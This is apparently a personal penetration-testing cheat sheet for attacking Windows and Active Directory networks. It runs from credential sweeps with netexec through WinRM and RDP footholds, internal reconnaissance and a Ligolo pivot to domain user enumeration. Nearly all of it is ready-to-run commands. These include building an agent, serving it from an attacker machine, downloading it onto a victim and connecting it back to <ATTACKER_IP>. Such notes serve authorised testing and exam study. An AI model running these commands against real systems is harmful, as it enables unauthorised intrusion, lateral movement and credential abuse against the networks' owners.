## Credential Validation & Scope

### SMB authentication sweep

`nxc smb <TARGET/range> -u <USER> -p <PASS> -d <DOMAIN>`


---

### WinRM access check 
```
`evil-winrm <TARGET_IP> -u <USER> -p <PASS> -d <DOMAIN>`
evil-winrm -i <TARGET_IP> -u <USER> -p <PASS> -e /path/to/tools
```

This is a test from Tay
---

## Initial Foothold (Interactive Access)

### WinRM shell

`evil-winrm -i <TARGET_IP> -u <USER> -p <PASS>`

OR (if RDP is available):

`xfreerdp /u:<USER> /p:<PASS> /d:<DOMAIN> /v:<TARGET_IP> /cert:ignore`

---



### Identify context

`whoami hostname`

---

### Network interfaces (CRITICAL)

`ipconfig /all`

**Look for:**

- Multiple NICs
    
- New subnets (pivot candidates)
    

---



### From inside the compromised host

`ping <INTERNAL_IP>`

or (if ICMP blocked):

`Test-NetConnection <INTERNAL_IP> -Port 445`

---

### From attacker machine (compare!)

`ping <INTERNAL_IP> nmap -p 445 <INTERNAL_IP>`

🧠 **Rule:**

> If victim can reach it and attacker can’t → pivot required

---

## 

### Build Ligolo agent (attacker)

`GOOS=windows GOARCH=amd64 go build -o agent.exe -ldflags="-s -w" cmd/agent/main.go`

---

### Start Ligolo proxy

`ligolo-proxy -selfcert`

---

### Create tunnel interface (attacker)

`ip tuntap add dev ligolo mode tun ip link set ligolo up`

---

### Add route to internal subnet

`ip route add <INTERNAL_SUBNET>/24 dev ligolo`

---

### Host agent for download

`python3 -m http.server 80`

---

### Download agent on victim

`wget http://<ATTACKER_IP>/agent.exe -OutFile agent.exe`

---

### Execute agent (victim)

`.\agent.exe -connect <ATTACKER_IP>:<PORT> -ignore-cert`

---

## 

### Validate access to internal hosts

`netexec smb <INTERNAL_SUBNET>/24 -u <USER> -p <PASS> -d <DOMAIN>`

---

## 

### Local users on foothold

`net user`

---

### Domain users (authenticated)

`netexec ldap <DC_IP> -u <USER> -p <PASS> -d <DOMAIN>`

**Look for:**

- `svc_` accounts
    
- SQL / backup / admin-like names
    
- Reused patterns
    

---
